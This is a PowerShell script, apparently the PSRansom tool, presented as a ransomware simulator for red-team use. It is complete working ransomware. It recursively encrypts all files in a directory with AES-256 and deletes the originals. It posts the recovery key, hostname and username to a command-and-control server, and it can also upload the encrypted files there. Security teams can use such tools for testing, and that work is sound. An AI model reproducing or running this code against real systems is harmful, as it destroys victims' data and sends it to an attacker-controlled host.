#================================#
#     PSRansom by @JoelGMSec     #
#      https://darkbyte.net      #
#================================#

# Design
$ProgressPreference = "SilentlyContinue"
$ErrorActionPreference = "SilentlyContinue"
$OSVersion = [Environment]::OSVersion.Platform
if ($OSVersion -like "*Win*") {
$Host.UI.RawUI.WindowTitle = "PSRansom - by @JoelGMSec" 
$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.ForegroundColor = "White" }

# Banner
function Show-Banner {
   Write-Host 
   Write-Host "  ____  ____  ____                                  " -ForegroundColor Blue
   Write-Host " |  _ \/ ___||  _ \ __ _ _ __  ___  ___  _ __ ___   " -ForegroundColor Blue
   Write-Host " | |_) \___ \| |_) / _' | '_ \/ __|/ _ \| '_ ' _ \  " -ForegroundColor Blue
   Write-Host " |  __/ ___) |  _ < (_| | | | \__ \ (_) | | | | | | " -ForegroundColor Blue
   Write-Host " |_|   |____/|_| \_\__,_|_| |_|___/\___/|_| |_| |_| " -ForegroundColor Blue
   Write-Host                                                            
   Write-Host "  ----------------- by @JoelGMSec ----------------  " -ForegroundColor Green }

# Help
function Show-Help {
   Write-host ; Write-Host " Info: " -ForegroundColor Yellow -NoNewLine ; Write-Host " This tool helps you simulate encryption process of a"
   Write-Host "        generic ransomware in PowerShell with C2 capabilities"
   Write-Host ; Write-Host " Usage: " -ForegroundColor Yellow -NoNewLine ; Write-Host ".\RansomShell.ps1 -e Directory -s C2Server -p C2Port" -ForegroundColor Blue 
   Write-Host "          Encrypt all files & sends recovery key to C2Server" -ForegroundColor Green
   Write-Host "          Use -x to exfiltrate and decrypt files on C2Server" -ForegroundColor Green
   Write-Host ; Write-Host "        .\RansomShell.ps1 -d Directory -k RecoveryKey" -ForegroundColor Blue 
   Write-Host "          Decrypt all files with recovery key string" -ForegroundColor Green
   Write-Host ; Write-Host " Warning: " -ForegroundColor Red -NoNewLine  ; Write-Host "All info will be sent to the C2Server without any encryption"
   Write-Host "         " -NoNewLine ; Write-Host " You need previously generated recovery key to retrieve files" ; Write-Host }

# Variables
$Mode = $args[0]
$Directory = $args[1]
$PSRKey = $args[3]
$C2Server = $args[3]
$C2Port = $args[5]
$Exfil = $args[6]
$C2Status = $null

# Errors
if ($args[0] -like "-h*") { Show-Banner ; Show-Help ; break }
if ($args[0] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($args[1] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($args[2] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($args[3] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }

# Proxy Aware
[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$AllProtocols = [System.Net.SecurityProtocolType]"Ssl3,Tls,Tls11,Tls12" ; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols

# Functions
$computer = ([Environment]::MachineName).ToLower() ; $user = ([Environment]::UserName).ToLower()
$Time = Get-Date -Format "HH:mm - dd/MM/yy" ; $TMKey = $time.replace(":","").replace(" ","").replace("-","").replace("/","")+$computer
if ($OSVersion -like "*Win*") { $domain = (([Environment]::UserDomainName).ToLower()+"\") ; $slash = "\" } else { $domain = $null ; $slash = "/" } 
$DirectoryTarget = $Directory.Split($slash)[-1] ; if (!$DirectoryTarget) { $DirectoryTarget = $Directory.Path.Split($slash)[-1] }

function Invoke-AESEncryption {
   [CmdletBinding()]
   [OutputType([string])]
   Param(
       [Parameter(Mandatory = $true)]
       [ValidateSet("Encrypt", "Decrypt")]
       [String]$Mode,

       [Parameter(Mandatory = $true)]
       [String]$Key,

       [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
       [String]$Text,

       [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
       [String]$Path)

   Begin {
      $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
      $aesManaged = New-Object System.Security.Cryptography.AesManaged
      $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
      $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
      $aesManaged.BlockSize = 128
      $aesManaged.KeySize = 256 }

   Process {
      $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
      switch ($Mode) {

         "Encrypt" {
             if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}

             if ($Path) {
                $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                if (!$File.FullName) { break }
                $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                $outPath = $File.FullName + ".psr" }

             $encryptor = $aesManaged.CreateEncryptor()
             $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
             $encryptedBytes = $aesManaged.IV + $encryptedBytes
             $aesManaged.Dispose()

             if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
             if ($Path) {
                [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                (Get-Item $outPath).LastWriteTime = $File.LastWriteTime }}

         "Decrypt" {
             if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}

             if ($Path) {
                $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                if (!$File.FullName) { break }
                $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                $outPath = $File.FullName.replace(".psr","") }

             $aesManaged.IV = $cipherBytes[0..15]
             $decryptor = $aesManaged.CreateDecryptor()
             $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
             $aesManaged.Dispose()

             if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
             if ($Path) {
                [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                (Get-Item $outPath).LastWriteTime = $File.LastWriteTime }}}}

  End {
      $shaManaged.Dispose()
      $aesManaged.Dispose()}}

function R64Encoder { 
   if ($args[0] -eq "-t") { $base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) }
   if ($args[0] -eq "-f") { $base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1])) }
   $base64 = $base64.Split("=")[0] ; $base64 = $base64.Replace("+", "–") ; $base64 = $base64.Replace("/", "_")
   $revb64 = $base64.ToCharArray() ; [array]::Reverse($revb64) ; $R64Base = -join $revb64 ; return $R64Base }

function ShowInfo {
   Write-Host ; Write-Host "[+] Hostname: " -NoNewLine -ForegroundColor Yellow ; Write-Host $computer
   Write-Host "[+] Current User: " -NoNewLine -ForegroundColor Yellow ; Write-Host $domain$user
   Write-Host "[+] Current Time: " -NoNewLine -ForegroundColor Yellow ; Write-Host $time }

function GetStatus {
   Try { Invoke-WebRequest -useb "http://$C2Server`:$C2Port/status" -Method GET 
      Write-Host "[i] Command & Control Server is up!" -ForegroundColor Green }
   Catch { Write-Host "[!] Command & Control Server is down!" -ForegroundColor Red }}

function SendResults {
   $DESKey = Invoke-AESEncryption -Mode Encrypt -Key $TMKey -Text $PSRKey ; $B64Key = R64Encoder -t $DESKey
   $C2Data = " [+] Key: $B64Key [+] Hostname: $computer [+] Current User: $domain$user [+] Current Time: $time"
   $RansomLogs = Get-Content log.txt ; if (!$RansomLogs) { $RansomLogs = "[!] No files have been encrypted!" }
   $B64Data = R64Encoder -t $C2Data ; $B64Logs = R64Encoder -t $RansomLogs
   Invoke-WebRequest -useb "http://$C2Server`:$C2Port/data" -Method POST -Body $B64Data 2>&1> $null
   Invoke-WebRequest -useb "http://$C2Server`:$C2Port/logs" -Method POST -Body $B64Logs 2>&1> $null }

function SendOK {
   Invoke-WebRequest -useb "http://$C2Server`:$C2Port/done" -Method GET 2>&1> $null }

function EncryptFiles {
   foreach ($i in $(Get-ChildItem $Directory -recurse -exclude *.psr | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { 
      Invoke-AESEncryption -Mode Encrypt -Key $PSRKey -Path $i ; Add-Content -Path log.txt -Value "[!] $i is now encrypted" ; Remove-Item $i }}

function ExfiltrateFiles {
   Invoke-WebRequest -useb "http://$C2Server`:$C2Port/files" -Method GET 2>&1> $null 
   foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.psr | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
      $Pfile = $i.split($slash)[-1] ; $B64file = R64Encoder -f $i ; $B64Name = R64Encoder -t $Pfile
      Invoke-WebRequest -useb "http://$C2Server`:$C2Port/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }
   if (!$i){ $B64Name = R64Encoder -t "none.null" ; Invoke-WebRequest -useb "http://$C2Server`:$C2Port/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }}

function DecryptFiles {
   foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.psr | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
      Invoke-AESEncryption -Mode Decrypt -Key $PSRKey -Path $i ; $rfile = $i.replace(".psr","")
      Write-Host "[+] $rfile is now decrypted" -ForegroundColor Blue ; Remove-Item key.txt }}

function CheckFiles { 
   $RFiles = Get-ChildItem $Directory -recurse -filter *.psr ; if ($RFiles) { $RFiles | Remove-Item } else {
   Write-Host "[!] No encrypted files has been found!" -ForegroundColor Red }}

# Main
Show-Banner ; ShowInfo

if ($Mode -eq "-d") { 
   Write-Host ; Write-Host "[!] Recovering ransomware infection on $DirectoryTarget directory.." -ForegroundColor Red
   Write-Host "[i] Applying recovery key on encrypted files.." -ForegroundColor Green
   DecryptFiles ; CheckFiles ; sleep 1 }
 
else {
   Write-Host ; Write-Host "[!] Simulating ransomware infection on $DirectoryTarget directory.." -ForegroundColor Red
   Write-Host "[+] Checking communication with Command & Control Server.." -ForegroundColor Blue
   $C2Status = GetStatus ; Remove-Item log.txt ; sleep 1

   Write-Host "[+] Generating new random string key for encryption.." -ForegroundColor Blue
   $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})

   Write-Host "[!] Encrypting all files with 256 bits AES key.." -ForegroundColor Red
   EncryptFiles ; if ($C2Status) { SendResults ; sleep 1

   if ($Exfil -eq "-x") { Write-Host "[i] Exfiltrating files to Command & Control Server.." -ForegroundColor Green
      ExfiltrateFiles ; sleep 1 }}

   if (!$C2Status) { Write-Host "[+] Saving key and logs to current folder.." -ForegroundColor Blue 
      $RansomLogs = Get-Content log.txt ; if (!$RansomLogs) { Add-Content -Path log.txt -Value "[!] No files have been encrypted!" }
      Add-Content -Path key.txt -Value $PSRKey }
   else { Write-Host "[+] Sending key and logs to Command & Control Server.." -ForegroundColor Blue ; SendOK ; Remove-Item log.txt }}

sleep 1 ; Write-Host "[i] Done!" -ForegroundColor Green ; Write-Host
